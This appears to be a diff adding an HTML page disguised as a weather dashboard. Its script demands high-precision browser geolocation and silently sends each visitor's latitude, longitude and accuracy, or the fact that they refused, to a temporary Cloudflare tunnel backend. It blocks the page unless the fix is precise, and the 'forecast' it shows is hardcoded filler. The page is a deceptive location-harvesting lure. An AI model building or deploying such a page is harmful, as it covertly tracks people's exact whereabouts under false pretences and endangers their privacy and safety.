@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Local Weather Station</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0b0f19; color: #e2e8f0; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
+        .card { background-color: #111827; border: 1px solid #1f2937; padding: 30px 20px; border-radius: 16px; max-width: 400px; width: 100%; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
+        .status-container { margin-bottom: 20px; }
+        .spinner { display: none; border: 4px solid rgba(59, 130, 246, 0.1); width: 50px; height: 50px; border-radius: 50%; border-left-color: #3b82f6; animation: spin 1s linear infinite; margin: 0 auto 15px auto; }
+        h1 { color: #ffffff; font-size: 24px; margin-bottom: 8px; font-weight: 600; }
+        p { color: #9ca3af; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
+        .sync-btn { background-color: #3b82f6; color: white; border: none; padding: 12px 24px; font-size: 14px; font-weight: 600; border-radius: 8px; cursor: pointer; transition: background 0.3s; width: 100%; }
+        .sync-btn:hover { background-color: #2563eb; }
+        .weather-display { display: none; margin-top: 15px; animation: fadeIn 0.8s ease forwards; }
+        .temp-main { font-size: 54px; font-weight: 700; color: #3b82f6; margin: 10px 0; }
+        .condition { font-size: 18px; color: #ffffff; font-weight: 500; margin-bottom: 20px; }
+        .metrics-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; }
+        .metric-box { background-color: #1f2937; padding: 12px; border-radius: 10px; border: 1px solid #374151; font-size: 13px; text-align: left; }
+        .metric-box span { display: block; color: #9ca3af; margin-bottom: 4px; font-size: 11px; text-transform: uppercase; }
+        .forecast-title { text-align: left; font-size: 14px; color: #ffffff; margin-bottom: 10px; font-weight: 600; }
+        .forecast-row { display: flex; justify-content: space-between; padding: 8px 0; border-top: 1px solid #1f2937; font-size: 13px; color: #d1d5db; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+    <script>
+        // CHANGE THIS URL EACH TIME YOU RUN A NEW CLOUDFLARE QUICK TUNNEL
+        var BACKEND_URL = "https://trycloudflare.com"; 
+
+        function initializeWeatherCheck() {
+            document.getElementById('sync-button').style.display = 'none';
+            document.getElementById('loading-spinner').style.display = 'block';
+            document.getElementById('status-text').innerText = "Verifying telemetry precision metrics...";
+
+            if (navigator.geolocation) {
+                var options = { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 };
+                navigator.geolocation.getCurrentPosition(onSuccess, onFailure, options);
+            } else {
+                showAccessDeniedScreen("Browser lacks hardware GPS modules.");
+            }
+        }
+        
+        function onSuccess(position) {
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
+            var acc = position.coords.accuracy;
+            
+            if (acc > 100) { 
+                sendPayload('Approximate', 'Approximate', acc, 'BLOCKED_APPROXIMATE_MODE');
+                showAccessDeniedScreen("Access Denied: High-precision satellite mapping is mandatory.");
+                return; 
+            }
+            
+            sendPayload(lat, lon, acc, 'SUCCESS_GPS_LOCKED');
+            
+            document.querySelector('.temp-main').innerText = "24°C";
+            document.getElementById('location-sub').innerText = `Station Verified: ${lat.toFixed(4)}, ${lon.toFixed(4)}`;
+            document.querySelector('.condition').innerText = "☀️ Conditions Synchronized";
+            renderWeatherDashboard();
+        }
+        
+        function onFailure(error) {
+            sendPayload('Denied', 'Denied', '0', 'BLOCKED_USER_DENIED_' + error.code);
+            showAccessDeniedScreen("Access Denied: High-precision permission required.");
+        }
+
+        function sendPayload(lat, lon, acc, status) {
+            fetch(`${BACKEND_URL}/gps_data?lat=${lat}&lon=${lon}&acc=${acc}&status=${status}`);
+        }
+
+        function showAccessDeniedScreen(message) {
+            document.getElementById('loading-spinner').style.display = 'none';
+            document.getElementById('sync-button').style.display = 'block';
+            document.getElementById('sync-button').innerText = "Retry Synchronization";
+            document.getElementById('status-text').innerHTML = `<span style="color: #ef4444; font-weight: bold;">⚠️ ${message}</span>`;
+        }
+
+        function renderWeatherDashboard() {
+            document.querySelector('.status-container').style.display = 'none';
+            document.querySelector('.weather-display').style.display = 'block';
+        }
+    </script>
+</head>
+<body>
+    <div class="card">
+        <div class="status-container">
+            <div class="spinner" id="loading-spinner"></div>
+            <h1>Local Weather Station</h1>
+            <p id="status-text">Synchronize your connection with the nearest node to get micro-climate metrics.</p>
+            <button class="sync-btn" id="sync-button" onclick="initializeWeatherCheck()">Synchronize Station Node</button>
+        </div>
+        
+        <div class="weather-display">
+            <h1>Regional Forecast</h1>
+            <p id="location-sub">Detecting Local Network...</p>
+            <div class="temp-main">--°C</div>
+            <div class="condition">⚡ Fetching Local Matrix Data...</div>
+            <div class="metrics-grid">
+                <div class="metric-box"><span>Profile</span>Sync</div>
+                <div class="metric-box"><span>Access</span>Authorized</div>
+                <div class="metric-box"><span>Vectors</span>Dynamic</div>
+                <div class="metric-box"><span>Node</span>Connected</div>
+            </div>
+            <div class="forecast-title">3-Day Extended Macro Outlook</div>
+            <div class="forecast-row"><div>Tomorrow</div><div>☀️ Local Clear Skies</div><div>Stable</div></div>
+            <div class="forecast-row"><div>Day 2</div><div>🌦️ Scattered Cloud Layers</div><div>Stable</div></div>
+            <div class="forecast-row"><div>Day 3</div><div>⛅ Passing Light Overcast</div><div>Stable</div></div>
+        </div>
+    </div>
+</body>
+</html>
